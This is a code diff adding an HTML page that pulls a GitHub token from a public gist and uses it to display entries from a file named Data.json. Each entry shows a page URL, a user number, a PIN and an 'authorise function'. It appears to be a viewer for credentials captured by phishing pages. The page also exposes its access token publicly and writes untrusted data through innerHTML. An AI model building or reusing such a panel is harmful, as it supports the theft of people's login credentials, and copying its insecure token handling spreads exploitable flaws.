@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Gist Data Viewer</title>
+  <style>
+    body { font-family: Arial, sans-serif; padding: 1rem; background: #f4f4f4; }
+    .entry {
+      background: white;
+      margin: 1rem 0;
+      padding: 1rem;
+      border-left: 4px solid #007acc;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+    .timestamp { font-weight: bold; color: #333; }
+    .field { margin: 0.3rem 0; }
+  </style>
+</head>
+<body>
+  <h2>📦 Gist Data (Data.json)</h2>
+  <div id="output">Loading...</div>
+
+  <script>
+    const tokenUrl = 'https://gist.githubusercontent.com/Dtech2preas/498a03fc1467fc14c66358e0f5721517/raw/a9f82f8fef545600174cdf9b5b1735b865bf5582/gistfile1.txt';
+    const gistId = 'baf8538c85354add526e6cb4c40dcd3a';
+    const fileName = 'Data.json';
+
+    async function fetchToken() {
+      const res = await fetch(tokenUrl);
+      if (!res.ok) throw new Error("Failed to fetch token");
+      return (await res.text()).trim();
+    }
+
+    async function fetchGistData(token) {
+      const gistUrl = `https://api.github.com/gists/${gistId}`;
+      const res = await fetch(gistUrl, {
+        headers: { Authorization: `token ${token}` }
+      });
+      if (!res.ok) throw new Error("Failed to fetch gist data");
+      const data = await res.json();
+      return JSON.parse(data.files[fileName].content);
+    }
+
+    function renderData(jsonData) {
+      const container = document.getElementById("output");
+      container.innerHTML = '';
+
+      const timestamps = Object.keys(jsonData).sort().reverse();
+      timestamps.forEach(ts => {
+        const entry = jsonData[ts];
+        const div = document.createElement("div");
+        div.className = "entry";
+        div.innerHTML = `
+          <div class="timestamp">📅 ${ts}</div>
+          <div class="field">🔗 Page: <a href="${entry.page_url}" target="_blank">${entry.page_url}</a></div>
+          <div class="field">🔢 Numtype: ${entry.numtype}</div>
+          <div class="field">🆔 Unum: ${entry.unum}</div>
+          <div class="field">🔐 PIN: ${entry.pin}</div>
+          <div class="field">🚀 Function: ${entry.authorise_function}</div>
+        `;
+        container.appendChild(div);
+      });
+    }
+
+    (async () => {
+      try {
+        const token = await fetchToken();
+        const data = await fetchGistData(token);
+        renderData(data);
+      } catch (err) {
+        document.getElementById("output").innerText = "❌ Error: " + err.message;
+        console.error(err);
+      }
+    })();
+  </script>
+</body>
+</html>
